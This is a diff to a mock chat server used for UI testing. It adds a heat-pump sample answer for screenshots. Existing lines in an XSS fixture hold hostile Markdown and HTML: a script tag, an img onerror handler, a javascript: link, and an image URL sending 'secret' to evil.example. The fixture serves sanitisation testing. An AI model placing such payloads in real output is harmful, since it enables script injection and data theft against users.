@@ -5,6 +5,7 @@
 //   "mock:slow ..."     streams 40 chunks, 150 ms apart (for Stop)
 //   "mock:xss"          answers with hostile Markdown and HTML
 //   "mock:fail"         a 500 before any text
+//   anything about a heat pump: a realistic Markdown answer (for screenshots)
 // and on the key: one starting "bad-" gets Gemini's invalid-key answer.
 import { createServer } from 'node:http'
 
@@ -17,6 +18,20 @@ const XSS = [
   '<script>window.__xss = 1</script><img src=x onerror="window.__xss=2">',
   '',
   '[click](javascript:window.__xss=3) ![tracker](https://evil.example/p.png?d=secret)',
+].join('\n')
+
+const SAMPLE = [
+  'For a 1960s house with about **38,000 BTU/h** of heat loss at -13°F, a cold-climate heat pump around **3.5 tons** covers it with headroom.',
+  '',
+  'Two things to check before you get quotes:',
+  '',
+  '1. **Ductwork.** An undersized trunk line will make any unit noisy and short of air.',
+  '2. **Backup heat.** Decide whether to keep the furnace for the coldest nights.',
+  '',
+  '| Size | Covers | Good for |',
+  '|---|---|---|',
+  '| 3 tons | ~36,000 BTU/h | tight, well-insulated homes |',
+  '| 3.5 tons | ~42,000 BTU/h | your house, with margin |',
 ].join('\n')
 
 function sse(res, chunks, delay) {
@@ -59,6 +74,7 @@ createServer((req, res) => {
       return
     }
     if (last.startsWith('mock:xss')) return sse(res, [XSS], 10)
+    if (/heat pump/i.test(last)) return sse(res, SAMPLE.match(/.{1,24}/gs), 12)
     if (last.startsWith('mock:slow')) return sse(res, Array.from({ length: 40 }, (_, n) => `word${n} `), 150)
     const reply = `You said: "${last}". This is turn ${turns.filter((t) => t.role === 'user').length} of our **chat**.`
     return sse(res, reply.match(/.{1,12}/gs) ?? [reply], 15)
